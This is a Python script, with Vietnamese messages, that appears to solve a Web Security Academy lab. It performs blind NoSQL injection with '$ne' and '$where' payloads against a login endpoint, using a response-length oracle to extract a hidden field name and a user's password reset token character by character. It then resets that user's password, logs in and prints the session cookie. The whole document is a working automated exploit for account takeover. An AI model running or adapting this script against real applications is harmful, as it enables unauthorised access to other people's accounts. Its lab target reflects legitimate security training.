import requests
import string
from bs4 import BeautifulSoup

host = 'YOUR_HOST.web-security-academy.net'
path_reset = '/forgot-password?'
path_login = '/login'

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
}

characters = string.ascii_letters + string.digits

session = requests.Session()
session.headers.update(headers)

payload1 = {
    "username": "carlos",
    "password": {"$ne": ""},
    "$where": ""
}

TOKENNAME = ""
print("[*] Đang tìm tên Object...")
for x in range(1, 5):
    name = ""
    for y in range(20):
        matched = False
        for z in characters:
            payload1["$where"] = f"Object.keys(this)[{x}].match('^.{{{y}}}{z}.*')"
            res = session.post(f"https://{host}{path_login}", json=payload1)
            
            if len(res.content) == 3618:  
                name += z
                matched = True
                break          
        if not matched:  
            break
            
    print(f"Object {x}: {name}")
    if x == 4: 
        TOKENNAME = name

print(f"\n[+] Tìm thấy TOKENNAME: {TOKENNAME}\n")

payload2 = {
    "username": "carlos",
    "password": {"$ne": ""},
    "$where": ""
}

passwordReset = ""
print("[*] Đang tìm Password Reset Token...")
for y in range(50):
    matched = False
    for z in characters:
        payload2["$where"] = f"this.{TOKENNAME}.match('^.{{{y}}}{z}.*')"
        res = session.post(f"https://{host}{path_login}", json=payload2)
        
        if len(res.content) == 3618:
            passwordReset += z
            matched = True
            break
            
    if not matched:
        break
    
    print(f"Tiến trình Password Reset: {passwordReset}")

print(f"\n[+] ĐÃ TÌM THẤY CHUỖI TOKEN: {passwordReset}\n")

reset_url = "https://" + host + path_reset + passwordReset

res_get_csrf = session.get(reset_url)
soup = BeautifulSoup(res_get_csrf.text, 'html.parser')

try:
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
except Exception:
    print("[-] Lỗi: Không thể tìm thấy csrf token trong form reset.")
    exit()

data_reset = {
    "csrf": csrf_token,
    "passwordReset": passwordReset,
    "new-password-1": "123",
    "new-password-2": "123"
}

res_post_reset = session.post(reset_url, data=data_reset, allow_redirects=True)

if res_post_reset.status_code == 200:
    print("[+] SUCCESS: Password đã được reset thành công.")
else:
    print("[-] Password KHÔNG được reset.")

data_login = {
    "username": "carlos",
    "password": "123"
}
res_login = session.post(f"https://{host}{path_login}", data=data_login, allow_redirects=False)

session_cookie = session.cookies.get("session") or res_login.cookies.get("session")
print("[+] Session cuối cùng thu được: ", session_cookie)

res_admin = session.get(f"https://{host}/my-account?id=carlos")
print("[+] Phản hồi HTTP trang my-account:", res_admin.status_code)